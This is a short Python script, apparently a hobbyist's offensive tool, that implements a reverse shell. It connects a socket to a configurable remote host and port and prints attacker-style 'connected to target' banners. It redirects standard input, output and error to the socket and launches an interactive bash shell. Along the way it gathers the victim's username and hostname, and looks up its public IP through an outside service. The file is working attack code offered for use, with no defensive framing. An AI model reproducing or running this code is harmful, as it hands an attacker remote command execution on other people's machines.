# !/usr/bin/env python3

import time
from subprocess import run
from os import dup2
import socket
import os
import requests


# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyjeek                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Github  :   @Keyj33k                  #
#   Version :   1.0.6                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # #

class Shell:

    def __init__(
            self,
            remote_username: str,
            remote_hostname: str,
            remote_ipv4_address: str,
            public_ipv4_address: str,
            remote_port: int
    ):
        self.remote_hostname = remote_hostname
        self.remote_username = remote_username
        self.public_ipv4_address = public_ipv4_address
        self.remote_ipv4_address = remote_ipv4_address
        self.remote_port = remote_port

    def shell(self):
        with socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
        ) as socket_sock:
            socket_sock.connect((
                self.remote_ipv4_address,
                self.remote_port
            ))

            socket_sock.send(
                f"\n\033[0;37m[\033[0;31m+\033[0;37m] Connected to {self.public_ipv4_address}!"
                    .encode()
            )
            socket_sock.send(
                f"\n\033[0;37m[\033[0;31m+\033[0;37m] Start interacting with target ..."
                    .encode()
            )

            time.sleep(1.75)

            socket_sock.send(
                f"\n\033[0;37m[\033[0;31m+\033[0;37m] You are now connected"
                    .encode() +
                f" to {self.remote_username}'s machine {self.remote_hostname} "
                    .encode()
            )
            socket_sock.send(
                f"\n\033[0;37m[\033[0;31m+\033[0;37m] Starting reverse shell to {self.remote_hostname} ..."
                    .encode()
            )

            time.sleep(1.75)

            dup2(
                socket_sock.fileno(),
                0
            )  # return stream integer file descriptor
            dup2(
                socket_sock.fileno(),
                1
            )  # used for request I/O actions from the OS
            dup2(
                socket_sock.fileno(),
                2
            )

            socket_sock.send(
                f"\n\033[0;37m[\033[0;31m+\033[0;37m] Successfully "
                    .encode() +
                f"started a reverse shell to {self.remote_username}'s machine!\n\n"
                    .encode()
            )

            run([
                "/bin/bash",
                "-i"
            ])


if __name__ == "__main__":
    os.system('clear')

    reverse_connection = Shell(
        os.getlogin(),
        socket.gethostname(),
        "127.0.0.1",
        requests.get('https://api.ipify.org').text,
        5003
    )

    reverse_connection.shell()
